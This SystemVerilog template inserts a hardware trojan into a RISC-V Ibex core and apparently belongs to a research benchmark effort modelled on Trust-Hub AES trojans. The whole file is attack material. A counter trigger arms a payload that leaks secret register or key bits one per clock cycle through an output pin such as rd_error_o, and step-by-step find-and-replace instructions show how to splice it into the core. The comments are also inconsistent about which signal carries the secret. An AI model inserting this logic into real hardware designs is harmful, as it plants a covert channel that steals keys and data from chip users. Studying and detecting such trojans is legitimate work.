/**
 * Sequential Information Leak Trojan - Code Snippet
 * 
 * Trust-Hub Category: Leak Information ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1000, AES-T1100, AES-T600, AES-T800
 * 
 * Description:
 *   Directly routes the LSB of a secret signal to an observable output
 *   pin when the trojan is active. Simpler and faster than the covert
 *   channel (no timing encoding): leaks 1 bit per clock cycle directly.
 *
 *   AES-T1000: routes internal AES key bits directly to an output port
 *   during encryption. Adapted here for RISC-V register/data leakage.
 *
 *   Covert vs Leak distinction:
 *     Leak:   direct routing (bit appears on output every cycle) - fast, obvious to monitor
 *     Covert: timing-encoded (pulse width encodes bit) - slower, harder to detect
 *   
 * Trigger: Counter on data_we_o
 * Payload: Route data_req_o[0] to observable output
 * 
 * NOTE: This template generates BASIC trigger logic only.
 *       The prepare_multi_trojan_simulation.py script will REPLACE
 *       this with varied trigger types (Type 1, 2, 3, 4) based on trojan index.
 * 
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Will be replaced with varied types)
// ============================================================

localparam int TRIGGER_THRESHOLD = 1000;
logic [15:0] trojan_counter;
logic        trojan_active;

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        trojan_counter <= '0;
        trojan_active  <= 1'b0;
    end else begin
        // Count activations - reduction OR handles multi-bit signals correctly
        if (|data_we_o) begin
            trojan_counter <= trojan_counter + 1;
        end
        if (trojan_counter >= TRIGGER_THRESHOLD) begin
            trojan_active <= 1'b1;
        end
    end
end

// ============================================================
// PAYLOAD: Direct Information Leak (1 bit per clock cycle)
// ============================================================
// When trojan_active=1, routes LSB of secret data to observable output.
// To leak all 32 bits, use a rotating bit index:
//   leak_bit_idx increments each cycle, leaking one bit per clock.
// ============================================================

logic [4:0] leak_bit_idx;   // Bit index rotates 0-31

always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
        leak_bit_idx <= '0;
    end else if (trojan_active) begin
        leak_bit_idx <= leak_bit_idx + 1;  // Rotates through bits 0-31
    end else begin
        leak_bit_idx <= '0;
    end
end

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// Information Leak: Route secret data bit to observable output.
//
// Integration Script Must:
//   Find the assign for data_req_o (or rd_error_o as fallback):
//     assign data_req_o = <normal_expr>;
//   Replace with:
//     assign data_req_o = trojan_active ? data_we_o[leak_bit_idx] : (<normal_expr>);
//
// Manual Example (ibex_csr - leak wr_data_i through rd_error_o):
//   Find:    assign rd_error_o = 1'b0;
//   Replace: assign rd_error_o = trojan_active ? wr_data_i[leak_bit_idx] : 1'b0;
//
// Simple variant (leak only LSB, no rotation):
//   assign rd_error_o = trojan_active ? data_we_o[0] : 1'b0;
//
// Effect: When trojan_active = 1:
//   rd_error_o outputs one secret bit per clock cycle.
//   Full 32-bit secret recovered in 32 clock cycles.
//   Result: Fast, direct key/data exfiltration - 1 bit per clock!